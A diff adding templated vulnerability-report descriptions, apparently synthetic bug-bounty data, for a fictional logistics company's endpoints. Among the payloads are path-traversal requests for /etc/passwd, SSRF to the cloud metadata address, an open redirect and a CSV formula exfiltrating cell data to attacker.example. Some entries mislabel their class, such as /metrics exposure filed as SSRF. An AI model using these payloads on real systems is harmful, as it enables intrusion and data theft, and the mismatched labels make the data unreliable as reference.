+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.auenrhein-logistics.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1834,7 +1847,8 @@
           "offset": "5d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.auenrhein-logistics.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1954,7 +1968,8 @@
           "offset": "12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.auenrhein-logistics.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2113,7 +2128,8 @@
           "offset": "8d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.auenrhein-logistics.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2215,7 +2231,8 @@
           "offset": "5d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.auenrhein-logistics.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2358,7 +2375,8 @@
           "offset": "2d",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.auenrhein-logistics.foo/profile`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2465,7 +2483,8 @@
           "offset": "5d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.auenrhein-logistics.foo/profile`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2600,7 +2619,8 @@
           "offset": "2d 17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.auenrhein-logistics.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2719,7 +2739,8 @@
           "offset": "4d 22h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.auenrhein-logistics.foo/import`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2834,7 +2855,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.auenrhein-logistics.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2938,7 +2960,8 @@
           "offset": "2d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.auenrhein-logistics.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3058,7 +3081,8 @@
           "offset": "21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.auenrhein-logistics.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3214,7 +3238,8 @@
           "offset": "4d 21h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.auenrhein-logistics.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3340,7 +3365,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.auenrhein-logistics.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3468,7 +3494,8 @@
           "offset": "3d 2h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.auenrhein-logistics.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3595,7 +3622,8 @@
           "offset": "1d 23h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.auenrhein-logistics.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3709,7 +3737,8 @@
           "offset": "6d 13h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.auenrhein-logistics.foo/export`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3810,7 +3839,8 @@
           "offset": "5d 16h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.auenrhein-logistics.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3961,7 +3991,8 @@
           "offset": "3d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.auenrhein-logistics.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4121,7 +4152,8 @@
           "offset": "6d 20h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.auenrhein-logistics.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4223,7 +4255,8 @@
           "offset": "1d 17h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.auenrhein-logistics.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4339,7 +4372,8 @@
           "offset": "1d 18h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.auenrhein-logistics.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4475,7 +4509,8 @@
           "offset": "7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.auenrhein-logistics.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4566,7 +4601,8 @@
           "offset": "1d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.auenrhein-logistics.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4736,7 +4772,8 @@
           "offset": "5d 14h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.auenrhein-logistics.foo/metrics`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4891,7 +4928,8 @@
           "offset": "8d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.auenrhein-logistics.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5045,7 +5083,8 @@
           "offset": "7d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.auenrhein-logistics.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5186,7 +5225,8 @@
           "offset": "6d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.auenrhein-logistics.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5301,7 +5341,8 @@
           "offset": "1d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.auenrhein-logistics.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5432,7 +5473,8 @@
           "offset": "1d",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.auenrhein-logistics.foo/export`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5586,7 +5628,8 @@
           "offset": "9d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.auenrhein-logistics.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5697,7 +5740,8 @@
           "offset": "1d 16h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
